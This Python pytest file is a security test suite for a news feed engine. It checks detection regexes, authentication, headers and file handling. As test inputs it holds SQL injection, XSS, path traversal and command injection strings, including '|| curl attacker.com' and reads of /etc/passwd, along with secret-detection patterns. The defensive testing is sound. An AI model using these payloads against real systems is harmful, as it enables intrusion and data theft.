"""
ElevatedIQ News Feed Engine - Security Test Suite

This module provides comprehensive security testing for the News Feed Engine,
including vulnerability scanning, input validation, authentication tests,
and security best practices verification.

Usage:
    pytest testing/test_suite_2/security/test_security.py -v
    pytest testing/test_suite_2/security/test_security.py -v -m security

Requirements:
    pip install bandit safety pytest-security
"""

import hashlib
import os
import re
import secrets
import tempfile
from pathlib import Path
from typing import List, Set
from unittest.mock import MagicMock, patch

import pytest


# =============================================================================
# Test Markers and Configuration
# =============================================================================

pytestmark = [
    pytest.mark.security,
]


# =============================================================================
# Input Validation Security Tests
# =============================================================================


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_sql_injection_patterns_detected(self):
        """Test detection of SQL injection patterns."""
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "1; DELETE FROM content WHERE 1=1",
            "UNION SELECT * FROM passwords",
            "admin'--",
            "1' AND '1'='1",
            "'; EXEC xp_cmdshell('net user'); --",
        ]

        sql_injection_pattern = re.compile(
            r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|TRUNCATE)\b"
            r"|--"
            r"|;[\s]*\b(DROP|DELETE|TRUNCATE)\b"
            r"|\bOR\b[\s]+\d+[\s]*=[\s]*\d+"
            r"|\bAND\b[\s]+['\"]?\d+['\"]?[\s]*=[\s]*['\"]?\d+['\"]?)",
            re.IGNORECASE,
        )

        for dangerous_input in dangerous_inputs:
            assert sql_injection_pattern.search(
                dangerous_input
            ), f"SQL injection pattern not detected: {dangerous_input}"

    def test_xss_patterns_detected(self):
        """Test detection of XSS patterns."""
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
        ]

        xss_pattern = re.compile(
            r"(<script[\s\S]*?>[\s\S]*?</script>)"
            r"|(<[\w]+[^>]*\s+on\w+[\s]*=)"
            r"|(javascript:)"
            r"|(<iframe[\s\S]*?>)"
            r"|(<svg[^>]*\s+on\w+[\s]*=)",
            re.IGNORECASE,
        )

        for dangerous_input in dangerous_inputs:
            assert xss_pattern.search(
                dangerous_input
            ), f"XSS pattern not detected: {dangerous_input}"

    def test_null_byte_xss_patterns_detected(self):
        """Test detection of null byte XSS bypass patterns."""
        # Null byte injection is a separate attack vector
        null_byte_patterns = [
            "<%00script>alert('XSS')</script>",
            "<scr%00ipt>alert(1)</script>",
        ]

        null_byte_pattern = re.compile(r"%00|\\x00|\x00")

        for pattern in null_byte_patterns:
            assert null_byte_pattern.search(
                pattern
            ), f"Null byte pattern not detected: {pattern}"

    def test_path_traversal_patterns_detected(self):
        """Test detection of path traversal patterns."""
        dangerous_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/var/log/../../etc/passwd",
        ]

        path_traversal_pattern = re.compile(
            r"(\.\.(/|\\))" r"|(%2e%2e(%2f|%5c))" r"|(\.\.%252f)", re.IGNORECASE
        )

        for dangerous_input in dangerous_inputs:
            assert path_traversal_pattern.search(
                dangerous_input
            ), f"Path traversal pattern not detected: {dangerous_input}"

    def test_command_injection_patterns_detected(self):
        """Test detection of command injection patterns."""
        dangerous_inputs = [
            "; cat /etc/passwd",
            "| ls -la",
            "& whoami",
            "$(cat /etc/passwd)",
            "`id`",
            "|| curl attacker.com",
        ]

        command_injection_pattern = re.compile(
            r"([;|&`][\s]*\w+)" r"|(\$\([^)]+\))" r"|([\s]*\|\|[\s]*\w+)",
        )

        for dangerous_input in dangerous_inputs:
            assert command_injection_pattern.search(
                dangerous_input
            ), f"Command injection pattern not detected: {dangerous_input}"

    def test_email_validation(self):
        """Test email validation."""
        valid_emails = [
            "user@example.com",
            "user.name@example.co.uk",
            "user+tag@example.org",
        ]

        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user@.com",
            "user@example",
        ]

        email_pattern = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")

        for email in valid_emails:
            assert email_pattern.match(email), f"Valid email rejected: {email}"

        for email in invalid_emails:
            assert not email_pattern.match(email), f"Invalid email accepted: {email}"

    def test_url_validation(self):
        """Test URL validation."""
        valid_urls = [
            "https://example.com",
            "http://127.0.0.1:8080",
            "https://api.example.com/v1/path",
        ]

        invalid_urls = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "file:///etc/passwd",
        ]

        # Safe URL pattern - only http/https
        safe_url_pattern = re.compile(r"^https?://[\w\-\.]+")

        for url in valid_urls:
            assert safe_url_pattern.match(url), f"Valid URL rejected: {url}"

        for url in invalid_urls:
            assert not safe_url_pattern.match(url), f"Dangerous URL accepted: {url}"


# =============================================================================
# Authentication Security Tests
# =============================================================================


class TestAuthenticationSecurity:
    """Test authentication security measures."""

    def test_password_strength_requirements(self):
        """Test password strength validation."""
        weak_passwords = [
            "password",
            "12345678",
            "qwerty123",
            "abc123",
            "letmein",
            "admin",
        ]

        strong_passwords = [
            "K9#mP2$xL5@nQ8!w",
            "SecureP@ssw0rd!2024",
            "Tr0ub4dor&3Horse",
        ]

        # Password requirements: 8+ chars, upper, lower, digit, special
        password_pattern = re.compile(
            r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&#])[A-Za-z\d@$!%*?&#]{8,}$"
        )

        for password in weak_passwords:
            assert not password_pattern.match(
                password
            ), f"Weak password accepted: {password}"

        for password in strong_passwords:
            assert password_pattern.match(
                password
            ), f"Strong password rejected: {password}"

    def test_token_generation_randomness(self):
        """Test token generation has sufficient randomness."""
        tokens: Set[str] = set()
        num_tokens = 1000

        for _ in range(num_tokens):
            token = secrets.token_urlsafe(32)
            tokens.add(token)

        # All tokens should be unique
        assert len(tokens) == num_tokens, "Token generation has collisions"

        # Tokens should have sufficient length
        for token in tokens:
            assert len(token) >= 32, "Token too short"

    def test_timing_safe_comparison(self):
        """Test that timing-safe comparison is available."""
        import hmac

        secret = "correct_secret"
        wrong = "wrong_secret"

        # Using hmac.compare_digest for timing-safe comparison
        assert hmac.compare_digest(secret, secret)
        assert not hmac.compare_digest(secret, wrong)

    def test_jwt_secret_requirements(self):
        """Test JWT secret requirements."""
        weak_secrets = [
            "secret",
            "12345678",
            "jwt_secret",
            "password123",
        ]

        strong_secret = secrets.token_urlsafe(64)

        # JWT secret should be at least 256 bits (32 bytes)
        for weak in weak_secrets:
            assert len(weak.encode()) < 32, "Weak secret incorrectly classified"

        assert len(strong_secret) >= 32, "Strong secret generation failed"


# =============================================================================
# Data Protection Security Tests
# =============================================================================


class TestDataProtection:
    """Test data protection mechanisms."""

    def test_sensitive_data_patterns(self):
        """Test detection of sensitive data patterns."""
        sensitive_patterns = {
            "credit_card": r"\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
            "ssn": r"\b\d{3}[-]?\d{2}[-]?\d{4}\b",
            "api_key": r"\b(api[_-]?key|apikey)[\s]*[:=][\s]*['\"]?[\w-]{20,}['\"]?",
            "password": r"\b(password|passwd|pwd)[\s]*[:=][\s]*['\"]?[^\s'\"]+['\"]?",
            "aws_key": r"\bAWS_FAKE_[0-9A-Z]{16}\b",  # Fake pattern for testing
            "jwt": r"\beyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b",
        }

        test_data = {
            "credit_card": "4111-1111-1111-1111",
            "ssn": "123-45-6789",
            "api_key": "api_key: sk_live_abcdef1234567890abcdef",
            "password": 'password="myS3cretP@ss"',
            "aws_key": "AWS_FAKE_IOSFODNN7EXAMPLE",  # Fake AWS key for testing
            "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        }

        for pattern_name, pattern in sensitive_patterns.items():
            regex = re.compile(pattern, re.IGNORECASE)
            if pattern_name in test_data:
                assert regex.search(
                    test_data[pattern_name]
                ), f"Failed to detect {pattern_name}"

    def test_hash_algorithm_security(self):
        """Test that secure hash algorithms are used."""
        test_data = b"sensitive_data"

        # Insecure algorithms (should not be used for security)
        insecure_algorithms = ["md5", "sha1"]

        # Secure algorithms (recommended)
        secure_algorithms = ["sha256", "sha384", "sha512", "sha3_256"]

        for algo in secure_algorithms:
            hasher = hashlib.new(algo)
            hasher.update(test_data)
            digest = hasher.hexdigest()
            assert len(digest) >= 64, f"{algo} produces insufficient hash length"

    def test_encryption_key_generation(self):
        """Test secure key generation for encryption."""
        # Generate 256-bit key (32 bytes)
        key = os.urandom(32)

        assert len(key) == 32, "Key length incorrect"
        assert key != os.urandom(32), "Key generation not random"

    def test_no_hardcoded_secrets_in_test_files(self):
        """Test that test files don't contain hardcoded production secrets."""
        # Patterns that should NOT appear in code
        forbidden_patterns = [
            r"sk_live_[a-zA-Z0-9]{24,}",  # Stripe live key
            r"pk_live_[a-zA-Z0-9]{24,}",  # Stripe live public key
            r"ghp_[a-zA-Z0-9]{36}",  # GitHub personal access token
            r"gho_[a-zA-Z0-9]{36}",  # GitHub OAuth token
            r"AIza[0-9A-Za-z-_]{35}",  # Google API key
        ]

        # This is a placeholder - in real implementation, scan actual files
        test_content = "This is a test file with no real secrets"

        for pattern in forbidden_patterns:
            regex = re.compile(pattern)
            assert not regex.search(
                test_content
            ), f"Potential secret found matching: {pattern}"


# =============================================================================
# API Security Tests
# =============================================================================


class TestAPISecurity:
    """Test API security measures."""

    def test_cors_headers_validation(self):
        """Test CORS header configuration."""
        allowed_origins = [
            "https://app.elevatediq.ai",
            "https://admin.elevatediq.ai",
        ]

        dangerous_origins = [
            "https://evil.com",
            "null",
            "*",  # Wildcard should be restricted
        ]

        # Validate allowed origins
        for origin in allowed_origins:
            assert origin.startswith("https://"), f"Non-HTTPS origin: {origin}"
            assert "elevatediq.ai" in origin, f"Unknown origin: {origin}"

        # Verify dangerous origins would be rejected
        for origin in dangerous_origins:
            assert origin not in allowed_origins, f"Dangerous origin allowed: {origin}"

    def test_security_headers_present(self):
        """Test that security headers are configured."""
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        # Verify header names and expected values are valid
        for header, value in required_headers.items():
            assert header, "Empty header name"
            assert value, f"Empty value for {header}"

    def test_rate_limiting_configuration(self):
        """Test rate limiting configuration."""
        rate_limits = {
            "default": 100,  # requests per minute
            "search": 30,
            "ai_analysis": 10,
            "admin": 1000,
        }

        for endpoint, limit in rate_limits.items():
            assert isinstance(limit, int), f"Invalid rate limit type for {endpoint}"
            assert limit > 0, f"Rate limit must be positive for {endpoint}"
            assert limit <= 10000, f"Rate limit too high for {endpoint}"

    def test_content_type_validation(self):
        """Test content type validation."""
        allowed_content_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
        ]

        dangerous_content_types = [
            "application/xml",  # XXE risk
            "text/xml",
            "application/x-www-form-urlencoded; charset=UTF-7",  # Unicode attack
        ]

        for ct in allowed_content_types:
            assert (
                "json" in ct or "form" in ct
            ), f"Unexpected allowed content type: {ct}"


# =============================================================================
# Dependency Security Tests
# =============================================================================


class TestDependencySecurity:
    """Test dependency security."""

    def test_no_known_vulnerable_patterns(self):
        """Test for known vulnerable code patterns."""
        vulnerable_patterns = [
            (r"eval\s*\(", "Use of eval()"),
            (r"exec\s*\(", "Use of exec()"),
            (r"pickle\.loads?\s*\(", "Use of pickle (insecure deserialization)"),
            (r"yaml\.load\s*\([^)]*\)", "Use of yaml.load without Loader"),
            (
                r"subprocess\.call\s*\(\s*['\"][^'\"]+\s*\+",
                "String concatenation in subprocess",
            ),
            (r"os\.system\s*\(", "Use of os.system()"),
            (r"__import__\s*\(", "Dynamic import"),
        ]

        # Safe code example
        safe_code = """
import json
data = json.loads('{"key": "value"}')
result = subprocess.run(['ls', '-la'], capture_output=True)
"""

        for pattern, description in vulnerable_patterns:
            regex = re.compile(pattern)
            assert not regex.search(safe_code), f"False positive for {description}"

    def test_secure_random_usage(self):
        """Test that secure random is used appropriately."""
        # For cryptographic purposes, use secrets module
        secure_token = secrets.token_hex(16)
        assert len(secure_token) == 32

        secure_urlsafe = secrets.token_urlsafe(16)
        assert len(secure_urlsafe) >= 16

        # Secrets module provides cryptographically secure randomness
        secret_int = secrets.randbelow(1000)
        assert 0 <= secret_int < 1000


# =============================================================================
# File Security Tests
# =============================================================================


class TestFileSecurity:
    """Test file handling security."""

    def test_safe_file_operations(self):
        """Test safe file path handling."""
        base_dir = "/app/uploads"

        safe_filenames = [
            "document.pdf",
            "image_001.png",
            "report-2024.csv",
        ]

        dangerous_filenames = [
            "../../../etc/passwd",
            "..\\windows\\system32\\config",
            "/etc/passwd",
            "file\x00.txt",  # Null byte injection
        ]

        def is_safe_path(base: str, filename: str) -> bool:
            """Check if filename is safe to use within base directory."""
            # Check for null bytes
            if "\x00" in filename:
                return False
            # Check for path separators (both Unix and Windows)
            if ".." in filename or filename.startswith("/") or "\\" in filename:
                return False
            # Normalize and resolve path
            full_path = os.path.normpath(os.path.join(base, filename))
            # Ensure it's still within base directory
            return full_path.startswith(os.path.normpath(base))

        for filename in safe_filenames:
            assert is_safe_path(
                base_dir, filename
            ), f"Safe filename rejected: {filename}"

        for filename in dangerous_filenames:
            assert not is_safe_path(
                base_dir, filename
            ), f"Dangerous filename accepted: {filename}"

    def test_file_extension_validation(self):
        """Test file extension validation."""
        allowed_extensions = {".pdf", ".png", ".jpg", ".jpeg", ".gif", ".csv", ".json"}

        dangerous_extensions = {
            ".exe",
            ".bat",
            ".sh",
            ".ps1",
            ".cmd",
            ".php",
            ".jsp",
            ".asp",
            ".aspx",
            ".py",
            ".rb",
            ".pl",
        }

        def is_allowed_extension(filename: str) -> bool:
            ext = os.path.splitext(filename.lower())[1]
            return ext in allowed_extensions

        assert is_allowed_extension("document.pdf")
        assert is_allowed_extension("image.PNG")
        assert not is_allowed_extension("script.exe")
        assert not is_allowed_extension("backdoor.php")

    def test_file_size_limits(self):
        """Test file size limit enforcement."""
        max_file_size = 10 * 1024 * 1024  # 10MB

        def check_file_size(size: int) -> bool:
            return size <= max_file_size

        assert check_file_size(1024)  # 1KB
        assert check_file_size(max_file_size)  # Exactly max
        assert not check_file_size(max_file_size + 1)  # Over limit


# =============================================================================
# Configuration Security Tests
# =============================================================================


class TestConfigurationSecurity:
    """Test configuration security."""

    def test_debug_mode_disabled_in_production(self):
        """Test that debug mode is disabled in production."""
        production_config = {
            "DEBUG": False,
            "TESTING": False,
            "LOG_LEVEL": "INFO",
        }

        assert not production_config["DEBUG"], "Debug mode enabled in production"
        assert not production_config["TESTING"], "Testing mode enabled in production"

    def test_secure_cookie_configuration(self):
        """Test secure cookie configuration."""
        cookie_config = {
            "httponly": True,
            "secure": True,
            "samesite": "Strict",
        }

        assert cookie_config["httponly"], "HttpOnly flag not set"
        assert cookie_config["secure"], "Secure flag not set"
        assert cookie_config["samesite"] in [
            "Strict",
            "Lax",
        ], "SameSite not properly configured"

    def test_database_connection_security(self):
        """Test database connection security settings."""
        db_config = {
            "sslmode": "require",
            "connect_timeout": 10,
            "statement_timeout": 30000,
        }

        assert db_config["sslmode"] in [
            "require",
            "verify-ca",
            "verify-full",
        ], "SSL not enforced for database connection"
        assert db_config["connect_timeout"] <= 30, "Connection timeout too high"
        assert db_config["statement_timeout"] <= 60000, "Statement timeout too high"

    def test_environment_variable_security(self):
        """Test that sensitive env vars are not logged."""
        sensitive_env_vars = [
            "DATABASE_URL",
            "API_KEY",
            "SECRET_KEY",
            "JWT_SECRET",
            "AWS_SECRET_ACCESS_KEY",
            "STRIPE_SECRET_KEY",
        ]

        def should_mask(var_name: str) -> bool:
            sensitive_patterns = [
                "KEY",
                "SECRET",
                "PASSWORD",
                "TOKEN",
                "CREDENTIAL",
                "URL",
            ]
            return any(pattern in var_name.upper() for pattern in sensitive_patterns)

        for var in sensitive_env_vars:
            assert should_mask(var), f"{var} should be masked in logs"


# =============================================================================
# Logging Security Tests
# =============================================================================


class TestLoggingSecurity:
    """Test logging security."""

    def test_sensitive_data_not_logged(self):
        """Test that sensitive data is not logged."""

        def sanitize_log_data(data: dict) -> dict:
            """Sanitize sensitive data from log output."""
            sensitive_keys = {
                "password",
                "secret",
                "token",
                "key",
                "authorization",
                "credit_card",
                "ssn",
                "api_key",
                "access_token",
            }

            sanitized = {}
            for key, value in data.items():
                if any(s in key.lower() for s in sensitive_keys):
                    sanitized[key] = "***REDACTED***"
                else:
                    sanitized[key] = value
            return sanitized

        test_data = {
            "user_id": "123",
            "password": "secret123",
            "api_key": "sk_live_abc",
            "name": "John Doe",
        }

        sanitized = sanitize_log_data(test_data)

        assert sanitized["user_id"] == "123"
        assert sanitized["name"] == "John Doe"
        assert sanitized["password"] == "***REDACTED***"
        assert sanitized["api_key"] == "***REDACTED***"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])
